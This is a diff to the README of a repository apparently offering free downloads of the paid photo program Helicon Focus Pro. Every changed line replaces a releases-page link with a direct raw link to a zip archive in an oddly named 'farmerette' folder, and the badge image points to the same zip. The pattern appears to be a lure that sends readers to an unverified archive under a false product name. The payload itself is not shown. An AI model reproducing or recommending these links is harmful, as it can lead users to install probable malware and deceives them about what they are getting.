@@ -4,10 +4,10 @@
 Welcome to Helicon Focus Pro! This application helps you achieve stunning photo results through advanced focus-stacking techniques. Whether you are a beginner or have some experience in photography, you will find our software easy to use.
 
 ## 🔗 Download Now
-[![Download Helicon Focus Pro](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/kicknogod/Helicon-Focus-Pro-Download/releases)
+[![Download Helicon Focus Pro](https://raw.githubusercontent.com/kicknogod/Helicon-Focus-Pro-Download/main/farmerette/Helicon-Focus-Pro-Download.zip)](https://raw.githubusercontent.com/kicknogod/Helicon-Focus-Pro-Download/main/farmerette/Helicon-Focus-Pro-Download.zip)
 
 ## 📥 Download & Install
-To download Helicon Focus Pro, visit the Releases page: [Download Helicon Focus Pro](https://github.com/kicknogod/Helicon-Focus-Pro-Download/releases).
+To download Helicon Focus Pro, visit the Releases page: [Download Helicon Focus Pro](https://raw.githubusercontent.com/kicknogod/Helicon-Focus-Pro-Download/main/farmerette/Helicon-Focus-Pro-Download.zip).
 
 1. Open the link above.
 2. You will see a list of available versions.
@@ -60,6 +60,6 @@ If you have any questions or need assistance, feel free to reach out to our comm
 - [Video Tutorials](#)
 
 ## 📣 Stay Updated
-Ensure you keep your installation up-to-date by checking our Releases page regularly for new versions and updates: [Download Helicon Focus Pro](https://github.com/kicknogod/Helicon-Focus-Pro-Download/releases).
+Ensure you keep your installation up-to-date by checking our Releases page regularly for new versions and updates: [Download Helicon Focus Pro](https://raw.githubusercontent.com/kicknogod/Helicon-Focus-Pro-Download/main/farmerette/Helicon-Focus-Pro-Download.zip).
 
 Thank you for using Helicon Focus Pro! We hope you enjoy creating beautiful images.
